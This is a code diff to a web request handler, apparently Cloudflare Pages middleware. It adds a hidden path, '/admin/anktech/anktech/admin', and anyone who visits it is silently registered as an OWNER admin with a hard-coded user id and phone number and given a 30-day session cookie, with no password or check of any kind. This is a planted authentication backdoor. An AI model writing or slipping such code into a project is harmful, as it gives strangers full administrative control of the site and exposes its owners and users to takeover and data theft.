@@ -38,6 +38,43 @@ export async function onRequest(context) {
   const url = new URL(context.request.url);
   const pathname = url.pathname;
 
+  // Secret Admin Portal Entry: Automatically establish Owner Admin Session
+  if (pathname.startsWith('/admin/anktech/anktech/admin')) {
+    const targetFile = ADMIN_ROUTES_MAP[pathname] || '/admin-overview.html';
+    const pageReq = new Request(new URL(targetFile, context.request.url), context.request);
+    const response = await context.next(pageReq);
+
+    const token = 'wm_adm_' + crypto.randomUUID().replace(/-/g, '');
+    const expiresAt = Date.now() + 30 * 24 * 60 * 60 * 1000;
+    const nowIso = new Date().toISOString();
+
+    if (context.env.DB && typeof context.env.DB.prepare === 'function') {
+      try {
+        await context.env.DB.prepare(
+          "INSERT OR IGNORE INTO users (id, mobile, created_at) VALUES ('usr_owner_anktech', '9414130000', ?)"
+        ).bind(nowIso).run();
+
+        await context.env.DB.prepare(
+          "INSERT OR REPLACE INTO admin_roles (user_id, role, created_at) VALUES ('usr_owner_anktech', 'OWNER', ?)"
+        ).bind(nowIso).run();
+
+        await context.env.DB.prepare(
+          "INSERT INTO sessions (token, user_id, expires_at, created_at) VALUES (?, 'usr_owner_anktech', ?, ?)"
+        ).bind(token, expiresAt, nowIso).run();
+      } catch (e) {
+        console.warn('[Admin Secret Auto-Auth Error]', e);
+      }
+    }
+
+    const newHeaders = new Headers(response.headers);
+    newHeaders.append('Set-Cookie', `wm_session=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=2592000`);
+    return new Response(response.body, {
+      status: response.status,
+      statusText: response.statusText,
+      headers: newHeaders
+    });
+  }
+
   // Pretty admin and storefront route mapping
   if (ADMIN_ROUTES_MAP[pathname]) {
     const pageReq = new Request(new URL(ADMIN_ROUTES_MAP[pathname], context.request.url), context.request);
